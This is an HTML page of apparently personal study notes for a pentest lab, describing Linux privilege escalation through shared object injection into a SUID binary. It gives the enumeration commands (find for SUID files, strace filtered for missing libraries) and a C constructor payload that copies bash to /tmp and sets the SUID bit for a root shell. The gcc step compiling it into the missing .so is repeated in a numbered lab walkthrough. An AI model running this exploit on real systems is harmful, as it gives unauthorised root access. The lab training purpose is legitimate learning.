<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Shared Object Injection</title>
</head><body><b>Escalation via Shared Object Injection</b><br/>
<br/>
<br/>
Challanging and required deep diving to find and exploit<br/>
<br/>
<br/>
Start with the permission find command<br/>
<br/>
<b>find / -type f -perm -04000 -ls 2&gt;/dev/null</b><br/>
<br/>
This will dsiaply a list of all files that have the <b>S bit set<br/>
</b><b><br/>
</b>Step 1. Check GTFO bins for a easy win<br/>
<br/>
If nothing available, move on to trying to find an oportunity to perform a SO (Shared Object) injection<br/>
<br/>
We are looking for something we can inject (file) or overwrite<br/>
<br/>
Check potentail shares with <b>ls -la &lt;file&gt;</b><br/>
<br/>
We will see s bit set on owner and group<br/>
<br/>
<img height="77" src="image.png" width="850"/><br/>
<br/>
Certain tools would also identify this, IE Linpeas<br/>
<br/>
Normally we would try run this file to furtehr understand what its doing.<br/>
<br/>
This may require another tool such as, <b>strace</b>, a diagnotstic tool that will output what is happenioeng behind the scencs and interaction file is doing.<br/>
<br/>
syntax &gt; <b>strace &lt;file&gt; 2&gt;&amp;1<br/>
</b><b><br/>
</b>We want to find where the file is outputting &quot;no such file or directory&quot;<br/>
<br/>
Narrow down<br/>
<br/>
syntax &gt; <b>strace &lt;file&gt; 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<br/>
</b><br/>
<img height="285" src="image 2.png" width="650"/><br/>
<br/>
We would enumare the list looking for an oportunity to 'overwrite' or inject our own malicious code.<br/>
<br/>
<b>ls -la &lt;file&gt;<br/>
</b><br/>
Looking to confirm no such file or directory<br/>
<br/>
when confirmed. We will insert our malicious file in place of the missing file. When the shared object file is run against and searches again, this time instead of returning no such file or directory, a file will exist, our malicious code and it will execute it.<br/>
<br/>
Create the malicious file, use waht ever is avilable... nano, vim etc..<br/>
written in C<br/>
<br/>
call it the file you are replacing .c<br/>
<br/>
code<br/>
<br/>
<b>#include &lt;stdio.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
<br/>
static void inject() __attribute__((constructor));<br/>
<br/>
void inject() {<ul><li style="list-style-type: none">system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);</li>
</ul>
</b><b>}</b><ul><li style="list-style-type: none"/>
</ul>
<br/>
Note with this code. it copies Bash to tmp folder and uses that copy instead of affecting the live copy of bash.<br/>
<br/>
You may need to create the folders that may also be missing <br/>
<br/>
mkdir &lt;folders&gt;<br/>
<br/>
then complie .c<br/>
<br/>
gcc -shared -fPIC -o &lt;output file loc and name... the one you want to impersonate&gt; &lt;the .c file created&gt;<br/>
<br/>
<br/>
<img height="27" src="image 3.png" width="650"/><ul><li style="list-style-type: none"/>
</ul>
File is now compiled and replaced. Re run the original SUID file<br/>
<br/>
This should give you root.<br/>
<br/>
<img height="122" src="image 4.png" width="700"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: find / -type f -perm -04000 -ls 2&gt;/dev/null<br/>
2. From the output, make note of all the SUID binaries.<br/>
3. In command line type:<br/>
strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<br/>
4. From the output, notice that a .so file is missing from a writable directory.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
5. In command prompt type: mkdir /home/user/.config<br/>
6. In command prompt type: cd /home/user/.config<br/>
7. Open a text editor and type:<br/>
<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
<br/>
static void inject() __attribute__((constructor));<br/>
<br/>
void inject() {<br/>
  system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);<br/>
}<br/>
<br/>
8. Save the file as libcalc.c<br/>
9. In command prompt type:<br/>
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c<br/>
10. In command prompt type: /usr/local/bin/suid-so<br/>
11. In command prompt type: id<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>